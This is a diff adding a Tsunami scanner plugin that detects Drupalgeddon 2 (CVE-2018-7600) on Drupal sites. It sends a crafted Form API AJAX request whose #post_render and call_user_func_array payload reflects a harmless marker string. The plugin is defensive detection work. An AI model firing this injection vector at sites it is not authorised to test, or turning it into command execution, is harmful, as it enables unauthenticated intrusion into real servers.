@@ -1,0 +1,100 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "Drupal_CVE_2018_7600"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " Tsunami Team (tsunami-dev@google.com) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "CVE_2018_7600"
+  }
+  severity: CRITICAL
+  title: "Drupalgeddon 2 (CVE-2018-7600)"
+  description: 
+    "This version of Drupal is vulnerable to CVE-2018-7600. Drupal versions before"
+    " 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1 are"
+    " vulnerable to this vulnerability. Drupal has insufficient input sanitation"
+    " on Form API AJAX requests. This enables an attacker to inject a malicious"
+    " payload into the internal form structure which would then be executed"
+    " without any authentication"
+  recommendation: 
+    "Upgrade to at least Drupal 8.3.9 or Drupal 8.5.1."
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2018-7600"
+  }
+}
+
+
+###########
+# ACTIONS #
+###########
+
+# very weak fingerprint check, not in the original plugin
+
+actions: {
+  name: "fingerprint_drupal"
+  http_request: {
+    method: GET
+    uri: "/"
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "Drupal" },
+          { body: {} contains: "drupal" }
+        ]
+      }
+    }
+  }
+}
+
+# we have a very simple reflected payload test. nothing changed from the original.
+# Note that this appears to work only for Drupal 8.
+
+actions: {
+  name: "send_payload"
+  http_request: {
+    method: POST
+    uri: "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/x-www-form-urlencoded"}
+    ]
+    data: 
+      "form_id=user_register_form&_drupal_ajax=1&mail[0]=BEGIN%1$sEND&mail[1]="
+      "scanning-CVE-2018-7600"
+      "&mail[#children]=sprintf&mail[#post_render][]=call_user_func_array"
+    response: {
+      expect_any: {
+        conditions: [
+          { body: {} contains: "BEGINscanning-CVE-2018-7600END" }
+        ]
+      }
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+
+workflows: {
+  actions: [
+    "fingerprint_drupal",
+    "send_payload"
+  ]
+}
+
